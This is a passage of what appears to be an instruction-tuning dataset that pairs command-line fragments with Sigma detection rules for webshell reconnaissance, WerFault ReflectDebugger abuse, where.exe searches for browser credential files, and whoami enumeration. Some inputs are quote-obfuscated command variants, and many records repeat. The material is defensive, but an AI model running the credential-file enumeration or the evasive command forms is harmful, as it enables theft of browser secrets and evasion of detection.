'\\httpd.exe'\n            - '\\nginx.exe'\n            - '\\php-cgi.exe'\n            - '\\w3wp.exe'\n            - '\\ws_tomcatservice.exe'\n    selection_webserver_characteristics_tomcat1:\n        ParentImage|endswith:\n            - '\\java.exe'\n            - '\\javaw.exe'\n        ParentImage|contains:\n            - '-tomcat-'\n            - '\\tomcat'\n    selection_webserver_characteristics_tomcat2:\n        ParentImage|endswith:\n            - '\\java.exe'\n            - '\\javaw.exe'\n        CommandLine|contains:\n            - 'CATALINA_HOME'\n            - 'catalina.jar'\n    selection_recon:\n        CommandLine|contains:\n            - 'perl --help'\n            - 'perl -h'\n            - 'python --help'\n            - 'python -h'\n            - 'python3 --help'\n            - 'python3 -h'\n            - 'wget --help'\n    condition: 1 of selection_webserver_* and selection_recon\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\caddy.exe \\httpd.exe \\nginx.exe \\php-cgi.exe \\w3wp.exe \\ws_tomcatservice.exe \\java.exe \\javaw.exe \\java.exe \\javaw.exe CATALINA_HOME catalina.jar pe\"rl\" --help perl -h python --help python -h python3 --help python3 -h wget --help", "output": "title: Webshell Tool Reconnaissance Activity\nid: f64e5c19-879c-4bae-b471-6d84c8339677\nstatus: test\ndescription: |\n    Detects processes spawned from web servers (PHP, Tomcat, IIS, etc.) that perform reconnaissance looking for the existence of popular scripting tools (perl, python, wget) on the system via the help commands\nreferences:\n    - https://ragged-lab.blogspot.com/2020/07/webshells-automating-reconnaissance.html\nauthor: Cian Heasley, Florian Roth (Nextron Systems)\ndate: 2020-07-22\nmodified: 2023-11-09\ntags:\n    - attack.persistence\n    - attack.t1505.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_webserver_image:\n        ParentImage|endswith:\n            - '\\caddy.exe'\n            - '\\httpd.exe'\n            - '\\nginx.exe'\n            - '\\php-cgi.exe'\n            - '\\w3wp.exe'\n            - '\\ws_tomcatservice.exe'\n    selection_webserver_characteristics_tomcat1:\n        ParentImage|endswith:\n            - '\\java.exe'\n            - '\\javaw.exe'\n        ParentImage|contains:\n            - '-tomcat-'\n            - '\\tomcat'\n    selection_webserver_characteristics_tomcat2:\n        ParentImage|endswith:\n            - '\\java.exe'\n            - '\\javaw.exe'\n        CommandLine|contains:\n            - 'CATALINA_HOME'\n            - 'catalina.jar'\n    selection_recon:\n        CommandLine|contains:\n            - 'perl --help'\n            - 'perl -h'\n            - 'python --help'\n            - 'python -h'\n            - 'python3 --help'\n            - 'python3 -h'\n            - 'wget --help'\n    condition: 1 of selection_webserver_* and selection_recon\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\caddy \\httpd \\nginx \\php-cgi \\w3wp \\ws_tomcatservice \\java \\javaw \\java \\javaw CATALINA_HOME catalina.jar perl --help perl -h python --help python -h python3 --help python3 -h wget --help", "output": "title: Webshell Tool Reconnaissance Activity\nid: f64e5c19-879c-4bae-b471-6d84c8339677\nstatus: test\ndescription: |\n    Detects processes spawned from web servers (PHP, Tomcat, IIS, etc.) that perform reconnaissance looking for the existence of popular scripting tools (perl, python, wget) on the system via the help commands\nreferences:\n    - https://ragged-lab.blogspot.com/2020/07/webshells-automating-reconnaissance.html\nauthor: Cian Heasley, Florian Roth (Nextron Systems)\ndate: 2020-07-22\nmodified: 2023-11-09\ntags:\n    - attack.persistence\n    - attack.t1505.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_webserver_image:\n        ParentImage|endswith:\n            - '\\caddy.exe'\n            - '\\httpd.exe'\n            - '\\nginx.exe'\n            - '\\php-cgi.exe'\n            - '\\w3wp.exe'\n            - '\\ws_tomcatservice.exe'\n    selection_webserver_characteristics_tomcat1:\n        ParentImage|endswith:\n            - '\\java.exe'\n            - '\\javaw.exe'\n        ParentImage|contains:\n            - '-tomcat-'\n            - '\\tomcat'\n    selection_webserver_characteristics_tomcat2:\n        ParentImage|endswith:\n            - '\\java.exe'\n            - '\\javaw.exe'\n        CommandLine|contains:\n            - 'CATALINA_HOME'\n            - 'catalina.jar'\n    selection_recon:\n        CommandLine|contains:\n            - 'perl --help'\n            - 'perl -h'\n            - 'python --help'\n            - 'python -h'\n            - 'python3 --help'\n            - 'python3 -h'\n            - 'wget --help'\n    condition: 1 of selection_webserver_* and selection_recon\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\caddy.exe \\httpd.exe \\nginx.exe \\php-cgi.exe \\w3wp.exe \\ws_tomcatservice.exe \\java.exe \\javaw.exe \\java.exe \\javaw.exe CATALINA_HOME catalina.jar perl --help perl -h python --help python -h python3 --help python3 -h wget --help", "output": "title: Webshell Tool Reconnaissance Activity\nid: f64e5c19-879c-4bae-b471-6d84c8339677\nstatus: test\ndescription: |\n    Detects processes spawned from web servers (PHP, Tomcat, IIS, etc.) that perform reconnaissance looking for the existence of popular scripting tools (perl, python, wget) on the system via the help commands\nreferences:\n    - https://ragged-lab.blogspot.com/2020/07/webshells-automating-reconnaissance.html\nauthor: Cian Heasley, Florian Roth (Nextron Systems)\ndate: 2020-07-22\nmodified: 2023-11-09\ntags:\n    - attack.persistence\n    - attack.t1505.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_webserver_image:\n        ParentImage|endswith:\n            - '\\caddy.exe'\n            - '\\httpd.exe'\n            - '\\nginx.exe'\n            - '\\php-cgi.exe'\n            - '\\w3wp.exe'\n            - '\\ws_tomcatservice.exe'\n    selection_webserver_characteristics_tomcat1:\n        ParentImage|endswith:\n            - '\\java.exe'\n            - '\\javaw.exe'\n        ParentImage|contains:\n            - '-tomcat-'\n            - '\\tomcat'\n    selection_webserver_characteristics_tomcat2:\n        ParentImage|endswith:\n            - '\\java.exe'\n            - '\\javaw.exe'\n        CommandLine|contains:\n            - 'CATALINA_HOME'\n            - 'catalina.jar'\n    selection_recon:\n        CommandLine|contains:\n            - 'perl --help'\n            - 'perl -h'\n            - 'python --help'\n            - 'python -h'\n            - 'python3 --help'\n            - 'python3 -h'\n            - 'wget --help'\n    condition: 1 of selection_webserver_* and selection_recon\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WerFault.exe WerFault.exe -pr", "output": "title: Potential ReflectDebugger Content Execution Via WerFault.EXE\nid: fabfb3a7-3ce1-4445-9c7c-3c27f1051cdd\nrelated:\n    - id: 0cf2e1c6-8d10-4273-8059-738778f981ad\n      type: derived\nstatus: test\ndescription: Detects execution of \"WerFault.exe\" with the \"-pr\" commandline flag that is used to run files stored in the ReflectDebugger key which could be used to store the path to the malware in order to masquerade the execution flow\nreferences:\n    - https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html\n    - https://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/\nauthor: X__Junior (Nextron Systems)\ndate: 2023-06-30\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1036\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\WerFault.exe'\n        - OriginalFileName: 'WerFault.exe'\n    selection_cli:\n        CommandLine|contains: ' -pr '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WerFault.exe WerFault.exe \"-\"\"p\"\"r\"", "output": "title: Potential ReflectDebugger Content Execution Via WerFault.EXE\nid: fabfb3a7-3ce1-4445-9c7c-3c27f1051cdd\nrelated:\n    - id: 0cf2e1c6-8d10-4273-8059-738778f981ad\n      type: derived\nstatus: test\ndescription: Detects execution of \"WerFault.exe\" with the \"-pr\" commandline flag that is used to run files stored in the ReflectDebugger key which could be used to store the path to the malware in order to masquerade the execution flow\nreferences:\n    - https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html\n    - https://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/\nauthor: X__Junior (Nextron Systems)\ndate: 2023-06-30\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1036\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\WerFault.exe'\n        - OriginalFileName: 'WerFault.exe'\n    selection_cli:\n        CommandLine|contains: ' -pr '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WerFault WerFault -pr", "output": "title: Potential ReflectDebugger Content Execution Via WerFault.EXE\nid: fabfb3a7-3ce1-4445-9c7c-3c27f1051cdd\nrelated:\n    - id: 0cf2e1c6-8d10-4273-8059-738778f981ad\n      type: derived\nstatus: test\ndescription: Detects execution of \"WerFault.exe\" with the \"-pr\" commandline flag that is used to run files stored in the ReflectDebugger key which could be used to store the path to the malware in order to masquerade the execution flow\nreferences:\n    - https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html\n    - https://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/\nauthor: X__Junior (Nextron Systems)\ndate: 2023-06-30\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1036\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\WerFault.exe'\n        - OriginalFileName: 'WerFault.exe'\n    selection_cli:\n        CommandLine|contains: ' -pr '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\WerFault.exe -pr WerFault.exe", "output": "title: Potential ReflectDebugger Content Execution Via WerFault.EXE\nid: fabfb3a7-3ce1-4445-9c7c-3c27f1051cdd\nrelated:\n    - id: 0cf2e1c6-8d10-4273-8059-738778f981ad\n      type: derived\nstatus: test\ndescription: Detects execution of \"WerFault.exe\" with the \"-pr\" commandline flag that is used to run files stored in the ReflectDebugger key which could be used to store the path to the malware in order to masquerade the execution flow\nreferences:\n    - https://cocomelonc.github.io/malware/2022/11/02/malware-pers-18.html\n    - https://www.hexacorn.com/blog/2018/08/31/beyond-good-ol-run-key-part-85/\nauthor: X__Junior (Nextron Systems)\ndate: 2023-06-30\ntags:\n    - attack.execution\n    - attack.defense-evasion\n    - attack.t1036\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\WerFault.exe'\n        - OriginalFileName: 'WerFault.exe'\n    selection_cli:\n        CommandLine|contains: ' -pr '\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\where.exe where.exe places.sqlite cookies.sqlite formhistory.sqlite logins.json key4.db key3.db sessionstore.jsonlz4 History Bookmarks Cookies Login Data", "output": "title: Suspicious Where Execution\nid: 725a9768-0f5e-4cb3-aec2-bc5719c6831a\nstatus: test\ndescription: |\n    Adversaries may enumerate browser bookmarks to learn more about compromised hosts.\n    Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about\n    internal network resources such as servers, tools/dashboards, or other related infrastructure.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1217/T1217.md\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-13\nmodified: 2022-06-29\ntags:\n    - attack.discovery\n    - attack.t1217\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    where_exe:\n        - Image|endswith: '\\where.exe'\n        - OriginalFileName: 'where.exe'\n    where_opt:\n        CommandLine|contains:\n            # Firefox Data\n            - 'places.sqlite'\n            - 'cookies.sqlite'\n            - 'formhistory.sqlite'\n            - 'logins.json'\n            - 'key4.db'\n            - 'key3.db'\n            - 'sessionstore.jsonlz4'\n            # Chrome Data\n            - 'History'\n            - 'Bookmarks'\n            - 'Cookies'\n            - 'Login Data'\n    condition: all of where_*\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\where.exe \\\"w\\\"\\\"h\\\"\\\"e\\\"\\\"r\\\"\\\"e\\\"\\\".\\\"\\\"e\\\"\\\"x\\\"\\\"e\\\" places.sqlite cookies.sqlite formhistory.sqlite logins.json key4.db key3.db sessionstore.jsonlz4 History Bookmarks Cookies Login Data", "output": "title: Suspicious Where Execution\nid: 725a9768-0f5e-4cb3-aec2-bc5719c6831a\nstatus: test\ndescription: |\n    Adversaries may enumerate browser bookmarks to learn more about compromised hosts.\n    Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about\n    internal network resources such as servers, tools/dashboards, or other related infrastructure.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1217/T1217.md\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-13\nmodified: 2022-06-29\ntags:\n    - attack.discovery\n    - attack.t1217\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    where_exe:\n        - Image|endswith: '\\where.exe'\n        - OriginalFileName: 'where.exe'\n    where_opt:\n        CommandLine|contains:\n            # Firefox Data\n            - 'places.sqlite'\n            - 'cookies.sqlite'\n            - 'formhistory.sqlite'\n            - 'logins.json'\n            - 'key4.db'\n            - 'key3.db'\n            - 'sessionstore.jsonlz4'\n            # Chrome Data\n            - 'History'\n            - 'Bookmarks'\n            - 'Cookies'\n            - 'Login Data'\n    condition: all of where_*\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\where where places.sqlite cookies.sqlite formhistory.sqlite logins.json key4.db key3.db sessionstore.jsonlz4 History Bookmarks Cookies Login Data", "output": "title: Suspicious Where Execution\nid: 725a9768-0f5e-4cb3-aec2-bc5719c6831a\nstatus: test\ndescription: |\n    Adversaries may enumerate browser bookmarks to learn more about compromised hosts.\n    Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about\n    internal network resources such as servers, tools/dashboards, or other related infrastructure.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1217/T1217.md\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-13\nmodified: 2022-06-29\ntags:\n    - attack.discovery\n    - attack.t1217\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    where_exe:\n        - Image|endswith: '\\where.exe'\n        - OriginalFileName: 'where.exe'\n    where_opt:\n        CommandLine|contains:\n            # Firefox Data\n            - 'places.sqlite'\n            - 'cookies.sqlite'\n            - 'formhistory.sqlite'\n            - 'logins.json'\n            - 'key4.db'\n            - 'key3.db'\n            - 'sessionstore.jsonlz4'\n            # Chrome Data\n            - 'History'\n            - 'Bookmarks'\n            - 'Cookies'\n            - 'Login Data'\n    condition: all of where_*\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\where.exe where.exe places.sqlite cookies.sqlite formhistory.sqlite logins.json key4.db key3.db sessionstore.jsonlz4 History Bookmarks Cookies Login Data", "output": "title: Suspicious Where Execution\nid: 725a9768-0f5e-4cb3-aec2-bc5719c6831a\nstatus: test\ndescription: |\n    Adversaries may enumerate browser bookmarks to learn more about compromised hosts.\n    Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about\n    internal network resources such as servers, tools/dashboards, or other related infrastructure.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1217/T1217.md\nauthor: frack113, Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-13\nmodified: 2022-06-29\ntags:\n    - attack.discovery\n    - attack.t1217\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    where_exe:\n        - Image|endswith: '\\where.exe'\n        - OriginalFileName: 'where.exe'\n    where_opt:\n        CommandLine|contains:\n            # Firefox Data\n            - 'places.sqlite'\n            - 'cookies.sqlite'\n            - 'formhistory.sqlite'\n            - 'logins.json'\n            - 'key4.db'\n            - 'key3.db'\n            - 'sessionstore.jsonlz4'\n            # Chrome Data\n            - 'History'\n            - 'Bookmarks'\n            - 'Cookies'\n            - 'Login Data'\n    condition: all of where_*\nfalsepositives:\n    - Unknown\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\whoami.exe whoami.exe -all", "output": "title: Enumerate All Information With Whoami.EXE\nid: c248c896-e412-4279-8c15-1c558067b6fa\nstatus: test\ndescription: Detects the execution of \"whoami.exe\" with the \"/all\" flag\nreferences:\n    - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/\n    - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/\n    - https://www.youtube.com/watch?v=DsJ9ByX84o4&t=6s\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-12-04\nmodified: 2024-03-05\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_main_img:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    selection_main_cli:\n        CommandLine|contains|windash: ' -all'\n    condition: all of selection_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\whoami.exe \\\"whoami.exe\\\" \\\"-all\\\"", "output": "title: Enumerate All Information With Whoami.EXE\nid: c248c896-e412-4279-8c15-1c558067b6fa\nstatus: test\ndescription: Detects the execution of \"whoami.exe\" with the \"/all\" flag\nreferences:\n    - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/\n    - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/\n    - https://www.youtube.com/watch?v=DsJ9ByX84o4&t=6s\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-12-04\nmodified: 2024-03-05\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_main_img:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    selection_main_cli:\n        CommandLine|contains|windash: ' -all'\n    condition: all of selection_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\whoami whoami -all", "output": "title: Enumerate All Information With Whoami.EXE\nid: c248c896-e412-4279-8c15-1c558067b6fa\nstatus: test\ndescription: Detects the execution of \"whoami.exe\" with the \"/all\" flag\nreferences:\n    - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/\n    - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/\n    - https://www.youtube.com/watch?v=DsJ9ByX84o4&t=6s\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-12-04\nmodified: 2024-03-05\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_main_img:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    selection_main_cli:\n        CommandLine|contains|windash: ' -all'\n    condition: all of selection_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\whoami.exe whoami.exe -all", "output": "title: Enumerate All Information With Whoami.EXE\nid: c248c896-e412-4279-8c15-1c558067b6fa\nstatus: test\ndescription: Detects the execution of \"whoami.exe\" with the \"/all\" flag\nreferences:\n    - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/\n    - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/\n    - https://www.youtube.com/watch?v=DsJ9ByX84o4&t=6s\nauthor: Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-12-04\nmodified: 2024-03-05\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_main_img:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    selection_main_cli:\n        CommandLine|contains|windash: ' -all'\n    condition: all of selection_main_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\whoami.exe whoami.exe", "output": "title: Whoami Utility Execution\nid: e28a5a99-da44-436d-b7a0-2afc20a5f413\nstatus: test\ndescription: Detects the execution of whoami, which is often used by attackers after exploitation / privilege escalation\nreferences:\n    - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/\n    - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-08-13\nmodified: 2023-11-30\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    condition: selection\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment\n    - Monitoring activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\whoami.exe \\\"w\\\"\\\"h\\\"\\\"o\\\"\\\"a\\\"\\\"m\\\"\\\"i\\\"\\\".\\\"\\\"e\\\"\\\"x\\\"\\\"e\\\"", "output": "title: Whoami Utility Execution\nid: e28a5a99-da44-436d-b7a0-2afc20a5f413\nstatus: test\ndescription: Detects the execution of whoami, which is often used by attackers after exploitation / privilege escalation\nreferences:\n    - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/\n    - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-08-13\nmodified: 2023-11-30\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    condition: selection\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment\n    - Monitoring activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\whoami whoami", "output": "title: Whoami Utility Execution\nid: e28a5a99-da44-436d-b7a0-2afc20a5f413\nstatus: test\ndescription: Detects the execution of whoami, which is often used by attackers after exploitation / privilege escalation\nreferences:\n    - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/\n    - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-08-13\nmodified: 2023-11-30\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    condition: selection\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment\n    - Monitoring activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\whoami.exe whoami.exe", "output": "title: Whoami Utility Execution\nid: e28a5a99-da44-436d-b7a0-2afc20a5f413\nstatus: test\ndescription: Detects the execution of whoami, which is often used by attackers after exploitation / privilege escalation\nreferences:\n    - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/\n    - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-08-13\nmodified: 2023-11-30\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    condition: selection\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment\n    - Monitoring activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "whoami.exe \\whoami.exe", "output": "title: Whoami Utility Execution\nid: e28a5a99-da44-436d-b7a0-2afc20a5f413\nstatus: test\ndescription: Detects the execution of whoami, which is often used by attackers after exploitation / privilege escalation\nreferences:\n    - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/\n    - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-08-13\nmodified: 2023-11-30\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    condition: selection\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment\n    - Monitoring activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "whoami.exe \\\"\\whoami.exe\\\"", "output": "title: Whoami Utility Execution\nid: e28a5a99-da44-436d-b7a0-2afc20a5f413\nstatus: test\ndescription: Detects the execution of whoami, which is often used by attackers after exploitation / privilege escalation\nreferences:\n    - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/\n    - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-08-13\nmodified: 2023-11-30\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    condition: selection\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment\n    - Monitoring activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "whoami \\whoami", "output": "title: Whoami Utility Execution\nid: e28a5a99-da44-436d-b7a0-2afc20a5f413\nstatus: test\ndescription: Detects the execution of whoami, which is often used by attackers after exploitation / privilege escalation\nreferences:\n    - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/\n    - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-08-13\nmodified: 2023-11-30\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    condition: selection\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment\n    - Monitoring activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "whoami.exe \\whoami.exe", "output": "title: Whoami Utility Execution\nid: e28a5a99-da44-436d-b7a0-2afc20a5f413\nstatus: test\ndescription: Detects the execution of whoami, which is often used by attackers after exploitation / privilege escalation\nreferences:\n    - https://brica.de/alerts/alert/public/1247926/agent-tesla-keylogger-delivered-inside-a-power-iso-daa-archive/\n    - https://app.any.run/tasks/7eaba74e-c1ea-400f-9c17-5e30eee89906/\nauthor: Florian Roth (Nextron Systems)\ndate: 2018-08-13\nmodified: 2023-11-30\ntags:\n    - attack.discovery\n    - attack.t1033\n    - car.2016-03-001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    condition: selection\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment\n    - Monitoring activity\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\whoami.exe whoami.exe /groups -groups", "output": "title: Group Membership Reconnaissance Via Whoami.EXE\nid: bd8b828d-0dca-48e1-8a63-8a58ecf2644f\nstatus: test\ndescription: Detects the execution of whoami.exe with the /group command line flag to show group membership for the current user, account type, security identifiers (SID), and attributes.\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/whoami\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-28\ntags:\n    - attack.discovery\n    - attack.t1033\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\whoami.exe'\n        - OriginalFileName: 'whoami.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' /groups'\n            - ' -groups'\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
